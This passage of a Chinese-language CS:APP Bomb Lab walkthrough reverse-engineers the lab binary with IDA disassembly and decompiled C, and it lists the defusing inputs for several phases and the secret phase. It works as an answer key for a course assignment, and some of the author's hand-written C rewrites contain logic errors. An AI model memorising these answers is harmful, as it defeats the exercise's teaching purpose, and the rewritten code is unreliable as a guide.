27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 .data: 00000000006025 A0 public n1 .data: 00000000006025 A0 ; BiTree n1 .data: 00000000006025 A0 n1 BiTree < 24 h , offset n21 , offset n22 , 0 > .data: 00000000006025 A0 ; DATA XREF: secret_phase+2B\u2191o .data: 00000000006025 C0 public n21 .data: 00000000006025 C0 ; BiTree n21 .data: 00000000006025 C0 n21 BiTree < 8 , offset n31 , offset n32 , 0 > .data: 00000000006025 C0 ; DATA XREF: .data:n1\u2191o .data: 00000000006025 E0 public n22 .data: 00000000006025 E0 ; BiTree n22 .data: 00000000006025 E0 n22 BiTree < 32 h , offset n33 , offset n34 , 0 > .data: 00000000006025 E0 ; DATA XREF: .data:n1\u2191o .data: 0000000000602600 public n32 .data: 0000000000602600 ; BiTree n32 .data: 0000000000602600 n32 BiTree < 16 h , offset n43 , offset n44 , 0 > .data: 0000000000602600 ; DATA XREF: .data:n21\u2191o .data: 0000000000602620 public n33 .data: 0000000000602620 ; BiTree n33 .data: 0000000000602620 n33 BiTree < 2 Dh , offset n45 , offset n46 , 0 > .data: 0000000000602620 ; DATA XREF: .data:n22\u2191o .data: 0000000000602640 public n31 .data: 0000000000602640 ; BiTree n31 .data: 0000000000602640 n31 BiTree < 6 , offset n41 , offset n42 , 0 > .data: 0000000000602640 ; DATA XREF: .data:n21\u2191o .data: 0000000000602660 public n34 .data: 0000000000602660 ; BiTree n34 .data: 0000000000602660 n34 BiTree < 6 Bh , offset n47 , offset n48 , 0 > .data: 0000000000602660 ; DATA XREF: .data:n22\u2191o .data: 0000000000602680 public n45 .data: 0000000000602680 ; BiTree n45 .data: 0000000000602680 n45 BiTree < 28 h , 0 , 0 , 0 > ; DATA XREF: .data:n33\u2191o .data: 00000000006026 A0 public n41 .data: 00000000006026 A0 ; BiTree n41 .data: 00000000006026 A0 n41 BiTree < 1 , 0 , 0 , 0 > ; DATA XREF: .data:n31\u2191o .data: 00000000006026 C0 public n47 .data: 00000000006026 C0 ; BiTree n47 .data: 00000000006026 C0 n47 BiTree < 63 h , 0 , 0 , 0 > ; DATA XREF: .data:n34\u2191o .data: 00000000006026 E0 public n44 .data: 00000000006026 E0 ; BiTree n44 .data: 00000000006026 E0 n44 BiTree < 23 h , 0 , 0 , 0 > ; DATA XREF: .data:n32\u2191o .data: 0000000000602700 public n42 .data: 0000000000602700 ; BiTree n42 .data: 0000000000602700 n42 BiTree < 7 , 0 , 0 , 0 > ; DATA XREF: .data:n31\u2191o .data: 0000000000602720 public n43 .data: 0000000000602720 ; BiTree n43 .data: 0000000000602720 n43 BiTree < 14 h , 0 , 0 , 0 > ; DATA XREF: .data:n32\u2191o .data: 0000000000602740 public n46 .data: 0000000000602740 ; BiTree n46 .data: 0000000000602740 n46 BiTree < 2 Fh , 0 , 0 , 0 > ; DATA XREF: .data:n33\u2191o .data: 0000000000602760 public n48 .data: 0000000000602760 ; BiTree n48 .data: 0000000000602760 n48 BiTree < 3 E9h , 0 , 0 , 0 > ; DATA XREF: .data:n34\u2191o \u662f\u4e2a\u4e8c\u53c9\u6392\u5e8f\u6811\u7684\u6837\u5b50\u3002 \u7528 VisuAlgo - \u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u9ad8\u5ea6\u5e73\u8861\u6811 \u753b\u7684\u56fe \u770b\u51fd\u6570\u7684\u9012\u5f52\u8c03\u7528\u53ef\u4ee5\u77e5\u9053\uff1a\u8f93\u5165\u7684\u6570\u636e\u6bd4\u8282\u70b9\u5927\u5219\u8bbf\u95ee\u5de6\u5b69\u5b50\uff0c\u5c0f\u4e8e\u5219\u8bbf\u95ee\u53f3\u5b69\u5b50\uff0c\u76f8\u7b49\u4f1a\u8fd4\u56de0\u3002\u7531\u4e8e\u7ed3\u679c\u9700\u8981\u4e3a 3 \uff0c\u7ed3\u5408\u4e0a\u9762\u9012\u5f52\u8c03\u7528\u7684\u7b97\u6cd5\uff0c\u6240\u4ee5\u5e94\u8be5\u662f 2 \u00d7 (2 \u00d7 0 + 1) + 1 \uff0c\u8bbf\u95ee\u987a\u5e8f\u5e94\u8be5\u662f\uff08\u8f93\u5165\u7684\u6570\u636e\u901a\u8fc7\u5f71\u54cd\u904d\u5386\u7684\u8def\u5f84\u6765\u5f71\u54cd\u7ed3\u679c\uff09\uff1a 24h 32h 6Bh \u4e5f\u5c31\u662f\u8bf4\uff0c\u53ef\u4ee5\u8f93\u5165 6Bh \u901a\u8fc7check\uff1a 1 107 \u5e94\u8be5\u5c31\u53ef\u4ee5\u7ed3\u675f\u4e86\uff01 flag 1 2 3 4 5 6 7 Science isn 't about why, it' s about why not ? 1 2 3 1 2 3 1 926 9 austinpowers 7 93 600 107 \u5b8c\u7ed3\u6492\u82b1... \u56fe\u7247\u6765\u6e90\uff1a \u4e0d\u89c9\u6653\u6653-\u871c\u6843\u732b \u6709\u95ee\u9898\u53ef\u4ee5\u8bc4\u8bba\u533a\u6216\u662f\u90ae\u7bb1\u544a\u8bc9\u6211\u3002\u611f\u6069\u3002 \u5e38\u89c1\u95ee\u9898 \u4e3a\u4ec0\u4e48\u662f\u5728\u7b2c\u56db\u5173\u540e\u9762\u52a0\u4e0a\u5b57\u7b26\u4e32\u89e6\u53d1\u9690\u85cf\u5173\uff1f\u6211\u770b\u5230\u4e86\u4e0a\u9762\u6709\u4e2a6\uff0c\u4e0d\u5e94\u8be5\u662f\u7b2c\u516d\u5173\u7684\u65f6\u5019\u8f93\u5165\u5417\uff1f \u989d\u8fd9\u4e2a...\u4f60\u4ed4\u7ec6\u770b\u4e00\u4e0b\u5c31\u4f1a\u53d1\u73b0\u5b83\u7684\u542b\u4e49\u5e94\u8be5\u662f\u7b2c\u516d\u5173\u7684\u65f6\u5019\u624d\u5f00\u59cb\u68c0\u67e5\u662f\u5426\u8fdb\u5165\u9690\u85cf\u5173\u3002\u800c\u8f93\u5165\u6570\u636e\u7684\u5730\u5740\u6b63\u597d\u662f\u7b2c\u56db\u5173\u7684\u5730\u65b9\uff0c\u4f60\u5728\u9759\u6001\u770b\u7684\u65f6\u5019\u4e0d\u662f\u90a3\u4e48\u5bb9\u6613\u770b\u51fa\u6765\uff0c\u4f46\u662f\u8c03\u8bd5\u7684\u65f6\u5019\u5c31\u4f1a\u5bb9\u6613\u5f97\u591a\u3002 \u4e3a\u4ec0\u4e48\u7b2c\u4e09\u5173\u7684\u8df3\u8f6c\u8868\u90a3\u4e48\u5947\u602a\uff1f \u6709\u5173\u6587\u7ae0\uff1a Does the order of case in Switch statement can vary the performance?","title":"Bomb Lab"},{"location":"szu_courses/csapp/bomb_lab/#main","text":"\u5176\u5b9e\u9898\u76ee\u5df2\u7ecf\u7ed9\u51fa\u4e86 main() \u51fd\u6570\u7684\u76f8\u5173\u5185\u5bb9\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 /* Do all sorts of secret stuff that makes the bomb harder to defuse. */ initialize_bomb (); printf ( \"Welcome to my fiendish little bomb. You have 6 phases with \\n \" ); printf ( \"which to blow yourself up. Have a nice day! \\n \" ); /* Hmm... Six phases must be more secure than one phase! */ input = read_line (); /* Get input */ phase_1 ( input ); /* Run the phase */ phase_defused (); /* Drat! They figured it out! * Let me know how they did it. */ printf ( \"Phase 1 defused. How about the next one? \\n \" ); /* The second phase is harder. No one will ever figure out * how to defuse this... */ input = read_line (); phase_2 ( input ); phase_defused (); printf ( \"That's number 2. Keep going! \\n \" ); /* I guess this is too easy so far. Some more complex code will * confuse people. */ input = read_line (); phase_3 ( input ); phase_defused (); printf ( \"Halfway there! \\n \" ); /* Oh yeah? Well, how good is your math? Try on this saucy problem! */ input = read_line (); phase_4 ( input ); phase_defused (); printf ( \"So you got that one. Try this one. \\n \" ); /* Round and 'round in memory we go, where we stop, the bomb blows! */ input = read_line (); phase_5 ( input ); phase_defused (); printf ( \"Congratulations! You've (mostly) defused the bomb! \\n \" ); printf ( \"Hit Control-C to escape phase 6 (for free!), but if you want to \\n \" ); printf ( \"try phase 6 for extra credit, you can continue. Just beware! \\n \" ); /* Oh, so you want more danger? Let's make this one extra hard. */ input = read_line (); phase_6 ( input ); phase_defused (); /* Wow, they got it! But isn't something... missing? Perhaps * something they overlooked? Mua ha ha ha ha! */ return 0 ; \u770b\u8d77\u6765\u662f\u67096\u4e2a\u5173\u5361\uff0c\u6bcf\u6b21\u90fd\u9700\u8981\u6709\u4e00\u6bb5\u8f93\u5165\uff0c\u5408\u6cd5\u5219\u62c6\u9664\u70b8\u5f39\uff0c\u975e\u6cd5\u5219\u70b8\u5f39\u7206\u70b8\u3002\u867d\u7136\u5df2\u7ecf\u77e5\u9053\u662f\u8fd9\u6837\uff0c\u4f46\u662f\u6211\u8fd8\u662f\u8981F5\u4e00\u4e0b\uff1a \u5148\u5728\u521d\u59cb\u5316 initialize_bomb() \u540e\u9762\u52a0\u4e2a\u65ad\u70b9\uff0c\u7136\u540e\u542f\u52a8\u52a8\u6001\u8c03\u8bd5\u3002","title":"main()"},{"location":"szu_courses/csapp/bomb_lab/#phase_1","text":"F8\u6b65\u8fdb\uff0c\u5728 phase_1() \u51fd\u6570\u524d\u8981\u6c42\u8f93\u5165\uff0c\u6211\u4eec\u5148\u53cc\u51fb phase_1 \u8fdb\u53bb\u770b\u770b\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 __int64 __fastcall phase_1 ( __int64 a1 ) { __int64 result ; // rax result = strings_not_equal (( _BYTE * ) a1 , \"Science isn't about why, it's about why not?\" ); if ( ( _DWORD ) result ) explode_bomb ( a1 , \"Science isn't about why, it's about why not?\" ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 .text: 0000000000400 E70 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 E70 .text: 0000000000400 E70 .text: 0000000000400 E70 public phase_1 .text: 0000000000400 E70 phase_1 proc near ; CODE XREF: main+90\u2191p .text: 0000000000400 E70 ; __unwind { .text: 0000000000400 E70 sub rsp , 8 .text: 0000000000400 E74 mov esi , offset aScienceIsnTAbo ; \"Science isn't about why, it's about why\"... .text: 0000000000400 E79 call strings_not_equal .text: 0000000000400 E7E test eax , eax .text: 0000000000400 E80 jz short loc_400E87 .text: 0000000000400 E82 call explode_bomb .text: 0000000000400 E87 ; --------------------------------------------------------------------------- .text: 0000000000400 E87 .text: 0000000000400 E87 loc_400E87 : ; CODE XREF: phase_1+10\u2191j .text: 0000000000400 E87 add rsp , 8 .text: 0000000000400 E8B retn .text: 0000000000400 E8B ; } // starts at 400E70 .text: 0000000000400 E8B phase_1 endp .text: 0000000000400 E8B C, decompiled by me 1 2 3 4 5 void phase_1 ( char str []) { if ( strings_not_equal ( str , \"Science isn't about why, it's about why not?\" )) { explode_bomb (); } } \u975e\u5e38\u660e\u663e\uff0c\u8c03\u7528 strings_not_equal() \u6bd4\u8f83\u5b57\u7b26\u4e32\uff0c\u53cc\u51fb\u8fdb\u5165\u53ef\u770b\u51fa\u8981\u6c42\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c\u4e0b\u8ff0\u5b57\u7b26\u4e32 1 Science isn 't about why, it' s about why not ? \u76f8\u7b49\uff0c\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u8c03\u7528 explode_bomb() \u5f15\u7206\u70b8\u5f39\u3002 \u5176\u4e2d\uff0c 1 2 test eax , eax jz short loc_400E87 \u5c06eax\u548ceax\u4e0e\u8fd0\u7b97\u540e\uff0c\u68c0\u67e5\u7ed3\u679c\u662f\u5426\u4e3a0\u3002\u6240\u4ee5\u6548\u679c\u5e94\u8be5\u662feax\u4e3a0\u7684\u65f6\u5019\u8df3\u8f6c\u3002\u4e5f\u53ef\u4ee5\u5199\u6210\uff1a 1 cmp eax , 0 testl eax against eax? The meaning of test is to AND the arguments together, and check the result for zero. So this code tests if EAX is zero or not. je will jump if zero. BTW, this generates a smaller instruction than cmp eax, 0 which is the reason that compilers will generally do it this way. \u5bf9\u4e8e strings_not_equal() \u6765\u8bf4\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 __int64 __fastcall strings_not_equal ( _BYTE * a1 , _BYTE * a2 ) { int v2 ; // er12 int v3 ; // eax unsigned int flag ; // edx __int64 v5 ; // rax char v6 ; // dl v2 = string_length ( a1 ); v3 = string_length ( a2 ); flag = 1 ; if ( v2 == v3 ) { LOBYTE ( flag ) = 0 ; if ( * a1 ) { LOBYTE ( flag ) = 1 ; if ( * a1 == * a2 ) { v5 = 0LL ; do { v6 = a1 [ v5 + 1 ]; if ( ! v6 ) return 0 ; ++ v5 ; } while ( v6 == a2 [ v5 ] ); flag = 1 ; } } } return flag ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 .text: 000000000040123 D ; =============== S U B R O U T I N E ======================================= .text: 000000000040123 D .text: 000000000040123 D .text: 000000000040123 D public strings_not_equal .text: 000000000040123 D strings_not_equal proc near ; CODE XREF: phase_1+9\u2191p .text: 000000000040123 D ; phase_defused+3A\u2193p .text: 000000000040123 D .text: 000000000040123 D var_18 = qword ptr - 18 h .text: 000000000040123 D var_10 = qword ptr - 10 h .text: 000000000040123 D var_8 = qword ptr - 8 .text: 000000000040123 D .text: 000000000040123 D ; __unwind { .text: 000000000040123 D mov [ rsp + var_18 ], rbx .text: 0000000000401242 mov [ rsp + var_10 ], rbp .text: 0000000000401247 mov [ rsp + var_8 ], r12 .text: 000000000040124 C sub rsp , 18 h .text: 0000000000401250 mov rbx , rdi .text: 0000000000401253 mov rbp , rsi .text: 0000000000401256 call string_length .text: 000000000040125 B mov r12d , eax .text: 000000000040125 E mov rdi , rbp .text: 0000000000401261 call string_length .text: 0000000000401266 mov edx , 1 .text: 000000000040126 B cmp r12d , eax .text: 000000000040126 E jnz short loc_4012A6 .text: 0000000000401270 movzx eax , byte ptr [ rbx ] .text: 0000000000401273 mov dl , 0 .text: 0000000000401275 test al , al .text: 0000000000401277 jz short loc_4012A6 .text: 0000000000401279 mov dl , 1 .text: 000000000040127 B cmp al , [ rbp + 0 ] .text: 000000000040127 E jnz short loc_4012A6 .text: 0000000000401280 mov eax , 0 .text: 0000000000401285 jmp short loc_401291 .text: 0000000000401287 ; --------------------------------------------------------------------------- .text: 0000000000401287 .text: 0000000000401287 loc_401287: ; CODE XREF: strings_not_equal+5B\u2193j .text: 0000000000401287 add rax , 1 .text: 000000000040128 B cmp dl , [ rbp + rax + 0 ] .text: 000000000040128 F jnz short loc_4012A1 .text: 0000000000401291 .text: 0000000000401291 loc_401291: ; CODE XREF: strings_not_equal+48\u2191j .text: 0000000000401291 movzx edx , byte ptr [ rbx + rax + 1 ] .text: 0000000000401296 test dl , dl .text: 0000000000401298 jnz short loc_401287 .text: 000000000040129 A mov edx , 0 .text: 000000000040129 F jmp short loc_4012A6 .text: 00000000004012 A1 ; --------------------------------------------------------------------------- .text: 00000000004012 A1 .text: 00000000004012 A1 loc_4012A1 : ; CODE XREF: strings_not_equal+52\u2191j .text: 00000000004012 A1 mov edx , 1 .text: 00000000004012 A6 .text: 00000000004012 A6 loc_4012A6 : ; CODE XREF: strings_not_equal+31\u2191j .text: 00000000004012 A6 ; strings_not_equal+3A\u2191j ... .text: 00000000004012 A6 mov eax , edx .text: 00000000004012 A8 mov rbx , [ rsp + 18 h + var_18 ] .text: 00000000004012 AC mov rbp , [ rsp + 18 h + var_10 ] .text: 00000000004012 B1 mov r12 , [ rsp + 18 h + var_8 ] .text: 00000000004012 B6 add rsp , 18 h .text: 00000000004012 BA retn .text: 00000000004012 BA ; } // starts at 40123D .text: 00000000004012 BA strings_not_equal endp .text: 00000000004012 BA C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int strings_not_equal ( char str1 [], char str2 []) { int str1_length = string_length ( str1 ); int str2_length = string_length ( str2 ); int flag = 1 ; if ( str1_length == str2_length ) { flag = 0 ; if ( str1 [ 0 ] != '\\0' ) { flag = 1 ; if ( str1 [ 0 ] != str2 [ 0 ]) { int index = 0 ; while ( str1 [ index + 1 ] != '\\0' ) { if ( str1 [ index + 1 ] != str2 [ index + 1 ]) { return flag ; } } flag = 0 ; } } } return flag ; } \u5bf9\u4e8e string_length() \u6765\u8bf4\uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 __int64 __fastcall string_length ( _BYTE * a1 ) { __int64 result ; // rax _BYTE * v2 ; // rdx result = 0LL ; if ( * a1 ) { v2 = a1 ; do result = ( unsigned int )(( _DWORD ) ++ v2 - ( _DWORD ) a1 ); while ( * v2 ); } return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 .text: 0000000000401221 ; =============== S U B R O U T I N E ======================================= .text: 0000000000401221 .text: 0000000000401221 .text: 0000000000401221 public string_length .text: 0000000000401221 string_length proc near ; CODE XREF: strings_not_equal+19\u2193p .text: 0000000000401221 ; strings_not_equal+24\u2193p .text: 0000000000401221 ; __unwind { .text: 0000000000401221 mov eax , 0 .text: 0000000000401226 cmp byte ptr [ rdi ], 0 .text: 0000000000401229 jz short locret_40123B .text: 000000000040122 B mov rdx , rdi .text: 000000000040122 E .text: 000000000040122 E loc_40122E : ; CODE XREF: string_length+18\u2193j .text: 000000000040122 E add rdx , 1 .text: 0000000000401232 mov eax , edx .text: 0000000000401234 sub eax , edi .text: 0000000000401236 cmp byte ptr [ rdx ], 0 .text: 0000000000401239 jnz short loc_40122E .text: 000000000040123 B .text: 000000000040123 B locret_40123B : ; CODE XREF: string_length+8\u2191j .text: 000000000040123 B rep retn .text: 000000000040123 B ; } // starts at 401221 .text: 000000000040123 B string_length endp .text: 000000000040123 B C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 int string_length ( char str []) { int length = 0 ; if ( str [ 0 ] != '\\0' ) { char * ptr = str ; while ( * ptr != '\\0' ) { ptr += 1 ; length = ptr - str ; } } return length ; } \u6240\u4ee5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\uff1a 1 Science isn 't about why, it' s about why not ? \u5c31\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e00\u4e2acheck\u3002","title":"phase_1()"},{"location":"szu_courses/csapp/bomb_lab/#phase_2","text":"\u5148\u53cc\u51fb\u8fdb\u6765\u770b\u770b\uff0c\u770b\u4e86\u4e2a\u5927\u6982\uff0c\u7136\u540e\u968f\u4fbf\u8f936\u4e2a\u6570\u5f00\u59cb\u6162\u6162\u8c03\uff1a Tip \u55ef\uff0c\u6ca1\u9519\uff0c\u5c31\u662f\u5148\u968f\u4fbf\u7ed96\u4e2a\u6570\u3002\u5373\u4f7f\u8fd96\u4e2a\u6570\u672c\u8eab\u4e0d\u80fd\u901a\u8fc7check\u4e5f\u65e0\u6240\u8c13\uff0c\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u8bd5\u7684\u65f6\u5019\u770b\u5b83\u5982\u4f55\u8fdb\u884c\u6bd4\u8f83\u7b49\u8fd0\u7b97\u7684\u3002\u5982\u679c\u5b83\u8981\u70b8\u4e86\uff0c\u4f60\u53ea\u9700\u8981\u6539\u53d8\u76f8\u5e94\u7684\u8df3\u8f6cflag\u8ba9\u5b83\u56de\u5f52\u6b63\u8f68\u5c31\u53ef\u4ee5\u4e86\uff0c\u4f46\u662f\u522b\u5fd8\u8bb0\u4e86\u8981\u8bb0\u4e0b\u5b83\u7684\u7b97\u6cd5\uff0c\u4f60\u9700\u8981\u8bb0\u4e0b\u6765\u624d\u80fd\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u65f6\u5019\u901a\u8fc7check\u3002 C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 __int64 __fastcall phase_2 ( __int64 a1 ) { char * v1 ; // rbp int v2 ; // er12 __int64 result ; // rax __int64 v4 ; // [rsp+0h] [rbp-48h] char v5 ; // [rsp+Ch] [rbp-3Ch] read_six_numbers ( a1 , ( __int64 ) & v4 ); v1 = ( char * ) & v4 ; v2 = 0 ; do { result = * (( unsigned int * ) v1 + 3 ); if ( * ( _DWORD * ) v1 != ( _DWORD ) result ) explode_bomb ( a1 , & v4 ); v2 += * ( _DWORD * ) v1 ; v1 += 4 ; } while ( v1 != & v5 ); if ( ! v2 ) explode_bomb ( a1 , & v4 ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 .text: 0000000000400 E8C ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 E8C .text: 0000000000400 E8C .text: 0000000000400 E8C public phase_2 .text: 0000000000400 E8C phase_2 proc near ; CODE XREF: main+AC\u2191p .text: 0000000000400 E8C .text: 0000000000400 E8C var_3C = byte ptr - 3 Ch .text: 0000000000400 E8C var_20 = qword ptr - 20 h .text: 0000000000400 E8C var_18 = qword ptr - 18 h .text: 0000000000400 E8C var_10 = qword ptr - 10 h .text: 0000000000400 E8C var_8 = qword ptr - 8 .text: 0000000000400 E8C .text: 0000000000400 E8C ; __unwind { .text: 0000000000400 E8C mov [ rsp + var_20 ], rbx .text: 0000000000400 E91 mov [ rsp + var_18 ], rbp .text: 0000000000400 E96 mov [ rsp + var_10 ], r12 .text: 0000000000400 E9B mov [ rsp + var_8 ], r13 .text: 0000000000400 EA0 sub rsp , 48 h .text: 0000000000400 EA4 mov rsi , rsp .text: 0000000000400 EA7 call read_six_numbers .text: 0000000000400 EAC mov rbp , rsp .text: 0000000000400 EAF lea r13 , [ rsp + 48 h + var_3C ] .text: 0000000000400 EB4 mov r12d , 0 .text: 0000000000400 EBA .text: 0000000000400 EBA loc_400EBA : ; CODE XREF: phase_2+48\u2193j .text: 0000000000400 EBA mov rbx , rbp .text: 0000000000400 EBD mov eax , [ rbp + 0 Ch ] .text: 0000000000400 EC0 cmp [ rbp + 0 ], eax .text: 0000000000400 EC3 jz short loc_400ECA .text: 0000000000400 EC5 call explode_bomb .text: 0000000000400 ECA ; --------------------------------------------------------------------------- .text: 0000000000400 ECA .text: 0000000000400 ECA loc_400ECA : ; CODE XREF: phase_2+37\u2191j .text: 0000000000400 ECA add r12d , [ rbx ] .text: 0000000000400 ECD add rbp , 4 .text: 0000000000400 ED1 cmp rbp , r13 .text: 0000000000400 ED4 jnz short loc_400EBA .text: 0000000000400 ED6 test r12d , r12d .text: 0000000000400 ED9 jnz short loc_400EE0 .text: 0000000000400 EDB call explode_bomb .text: 0000000000400 EE0 ; --------------------------------------------------------------------------- .text: 0000000000400 EE0 .text: 0000000000400 EE0 loc_400EE0 : ; CODE XREF: phase_2+4D\u2191j .text: 0000000000400 EE0 mov rbx , [ rsp + 48 h + var_20 ] .text: 0000000000400 EE5 mov rbp , [ rsp + 48 h + var_18 ] .text: 0000000000400 EEA mov r12 , [ rsp + 48 h + var_10 ] .text: 0000000000400 EEF mov r13 , [ rsp + 48 h + var_8 ] .text: 0000000000400 EF4 add rsp , 48 h .text: 0000000000400 EF8 retn .text: 0000000000400 EF8 ; } // starts at 400E8C .text: 0000000000400 EF8 phase_2 endp .text: 0000000000400 EF8 C, decompiled by me 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void phase_2 () { int array [ 6 ]; read_six_numbers ( arg1 , array ); int sum = 0 ; int * ptr = arrray ; while ( ptr != ( array + 3 )) { if ( ptr [ 0 ] != ptr [ 3 ]) { explode_bomb (); } sum += * ptr ; ptr += 1 ; } if ( sum == 0 ) { explode_bomb (); } } \u5bf9\u4e86\uff0c\u5e0c\u671b\u4f60\u5df2\u7ecf\u77e5\u9053\u4e86 a[i] \u662f *(a+i) \u7684\u8bed\u6cd5\u7cd6\u3002 \u770b\u8d77\u6765\u50cf\u662f\u8f93\u51656\u4e2a\u6570\u5b57\uff0c\u524d\u4e09\u4e2a\u548c\u540e\u4e09\u4e2a\u9700\u8981\u5206\u522b\u76f8\u7b49\uff0c \u5e76\u4e14\u4e0d\u80fd\u5168\u4e3a0 \u66f4\u65b0\uff1a6\u4e2a\u6570\u7d2f\u52a0\u548c\u4e0d\u80fd\u4e3a0\uff08\u611f\u8c22\u63d0\u9192\uff09\u3002 \u53e6\u5916\uff0c\u518d\u770b\u770b read_six_numbers() \uff1a C, decompiled by IDA 1 2 3 4 5 6 7 8 9 __int64 __fastcall read_six_numbers ( __int64 a1 , __int64 a2 ) { __int64 result ; // rax result = __isoc99_sscanf ( a1 , & unk_401EB2 , a2 , a2 + 4 , a2 + 8 , a2 + 12 ); if ( ( signed int ) result <= 5 ) explode_bomb ( a1 , & unk_401EB2 ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 .text: 0000000000401743 ; =============== S U B R O U T I N E ======================================= .text: 0000000000401743 .text: 0000000000401743 .text: 0000000000401743 public read_six_numbers .text: 0000000000401743 read_six_numbers proc near ; CODE XREF: phase_2+1B\u2191p .text: 0000000000401743 .text: 0000000000401743 var_18 = qword ptr - 18 h .text: 0000000000401743 var_10 = qword ptr - 10 h .text: 0000000000401743 .text: 0000000000401743 ; __unwind { .text: 0000000000401743 sub rsp , 18 h .text: 0000000000401747 mov rdx , rsi .text: 000000000040174 A lea rcx , [ rsi + 4 ] .text: 000000000040174 E lea rax , [ rsi + 14 h ] .text: 0000000000401752 mov [ rsp + 18 h + var_10 ], rax .text: 0000000000401757 lea rax , [ rsi + 10 h ] .text: 000000000040175 B mov [ rsp + 18 h + var_18 ], rax .text: 000000000040175 F lea r9 , [ rsi + 0 Ch ] .text: 0000000000401763 lea r8 , [ rsi + 8 ] .text: 0000000000401767 mov esi , offset unk_401EB2 .text: 000000000040176 C mov eax , 0 .text: 0000000000401771 call ___isoc99_sscanf .text: 0000000000401776 cmp eax , 5 .text: 0000000000401779 jg short loc_401780 .text: 000000000040177 B call explode_bomb .text: 0000000000401780 ; --------------------------------------------------------------------------- .text: 0000000000401780 .text: 0000000000401780 loc_401780: ; CODE XREF: read_six_numbers+36\u2191j .text: 0000000000401780 add rsp , 18 h .text: 0000000000401784 retn .text: 0000000000401784 ; } // starts at 401743 .text: 0000000000401784 read_six_numbers endp .text: 0000000000401784 C, decompiled by me 1 2 3 4 5 6 // \uff08\u7701\u7565\u4e86\u90e8\u5206\u5185\u5bb9\uff09 void read_six_numbers ( char arg1 [], int array []) { if ( scanf ( \"%d %d %d %d %d %d\" , array , array + 1 , array + 2 , array + 3 , array + 4 , array + 5 ) <= 5 ) { explode_bomb (); } } \u7efc\u4e0a\uff0c\u968f\u610f\u6784\u9020\u524d\u4e09\u4e2a\u548c\u540e\u4e09\u4e2a\u6570\u5b57\u5206\u522b\u76f8\u7b49\u4e14 \u4e0d\u5168\u4e3a0 \u7d2f\u52a0\u548c\u4e0d\u4e3a0\u7684\u516d\u4e2a\u6570\u5b57\u5373\u53ef\uff0c\u4f8b\u5982\uff1a 1 1 2 3 1 2 3 \u5e94\u8be5\u80fd\u901a\u8fc7\u7b2c\u4e8c\u4e2acheck\u3002","title":"phase_2()"},{"location":"szu_courses/csapp/bomb_lab/#phase_3","text":"\u8fd9\u5173\u4e3b\u8981\u662f switch \u548c\u8df3\u8f6c\u8868\u3002 C, decompiled by IDA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 signed __int64 __fastcall phase_3 ( __int64 a1 , __int64 a2 , __int64 a3 , __int64 a4 , __int64 a5 , __int64 a6 ) { signed __int64 result ; // rax int v7 ; // [rsp+8h] [rbp-10h] int v8 ; // [rsp+Ch] [rbp-Ch] if ( ( signed int ) __isoc99_sscanf ( a1 , \"%d %d\" , & v8 , & v7 , a5 , a6 ) <= 1 ) explode_bomb ( a1 , \"%d %d\" ); switch ( v8 ) { case 0 : result = 535LL ; break ; case 1 : result = 926LL ; break ; case 2 : result = 214LL ; break ; case 3 : result = 339LL ; break ; case 4 : result = 119LL ; break ; case 5 : result = 352LL ; break ; case 6 : result = 919LL ; break ; case 7 : result = 412LL ; break ; default : explode_bomb ( a1 , \"%d %d\" ); return result ; } if ( ( _DWORD ) result != v7 ) explode_bomb ( a1 , \"%d %d\" ); return result ; } ASM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 .text: 0000000000400 EF9 ; =============== S U B R O U T I N E ======================================= .text: 0000000000400 EF9 .text: 0000000000400 EF9 .text: 0000000000400 EF9 public phase_3 .text: 0000000000400 EF9 phase_3 proc near ; CODE XREF: main+C8\u2191p .text: 0000000000400 EF9 .text: 0000000000400 EF9 var_10 = dword ptr - 10 h .text: 0000000000400 EF9 var_C = dword ptr - 0 Ch .text: 0000000000400 EF9 .text: 0000000000400 EF9 ; __unwind { .text: 0000000000400 EF9 sub rsp , 18 h 